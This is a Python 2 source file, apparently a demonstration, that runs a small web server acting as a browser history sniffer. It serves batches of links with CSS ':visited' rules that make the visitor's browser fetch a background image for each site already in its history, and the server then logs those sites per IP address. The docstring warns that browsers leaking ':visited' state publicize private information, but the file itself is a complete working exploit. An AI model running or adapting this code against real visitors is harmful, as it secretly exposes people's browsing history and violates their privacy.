#!/usr/bin/env python
# encoding: utf-8

"""A simple history sniffer - stripped down version. This version is stripped down for size - least number of lines. Please look at server.py for a commented version. Please don't let your browser load anything depending on the :visited state of a link tag! That publicizes private information!"""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from hashlib import md5
website_seed = ["http://google.com", "http://wikipedia.org", "http://google.de", "http://blubber.blau"]
hosts = {}
f = open("1w6-favicon-32.png", "r")
BG_IMAGE_DATA = f.read()
f.close()

def single_link(site):
    return '<span id="' + "spoof" + str(md5(site).hexdigest()) + '"><a href="' + site + '"><span>- ' + site + '</span></a></span>'
def create_style(links):
    style = "<style><!--"
    for link in links:
        img_url = "/img/" + str(link) + ".png"
        style += "#" + "spoof"  + str(md5(link).hexdigest()) + " a:visited {color: red; background-image: url(" + img_url + ");}\n"
    return style + "--></style>"
def spoof_html(IP):
    html = '<html><head>'
    if hosts[IP]["new"]:
        html += '<meta http-equiv="refresh" content="' + str(5) + '; URL=/">'
    links = hosts[IP]["new"][:100]
    hosts[IP]["new"] = hosts[IP]["new"][100:]
    html += create_style(links) + '</head><body>'
    if not links: html += "<h1>Finished</h1>"
    else: html += "<h1>Checking sites</h1>"
    return html + "\n".join([single_link(link) for link in links]) + "<h1>Found sites in YOUR history</h1><p>" + "<br />".join(hosts[IP]["found"]) + "</p><p><em>If there blubber.blau is in there, you’re safe. If the list is empty, you MIGHT be safe.</em></p>" + "</body></html>"
def process_Ip(IP):
    if not IP in hosts:
        new = website_seed
        found = []
        hosts[IP] = {"new": new, "found": found}
    if not hosts[IP]["new"]: return False
    else: return True
def process_image_request(IP, img_name):
    if not IP in hosts:
        return ""
    if not img_name[:-4] in hosts[IP]["found"]: 
        hosts[IP]["found"].append(img_name[:-4])
    return BG_IMAGE_DATA

class HTTPHtmlHandler(BaseHTTPRequestHandler): 
    def do_GET(self): 
        self.send_response(200)
        IP = self.client_address[0]
        process_Ip(IP)
        if self.path.startswith("/img/"):
            self.send_header("Content-Type", "image/png")
            self.end_headers()
            self.wfile.write(process_image_request(IP, self.path[5:]))
        else:
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(spoof_html(IP))
if __name__ == "__main__": 
    try:
        server = HTTPServer(('', 8000), HTTPHtmlHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        server.socket.close()
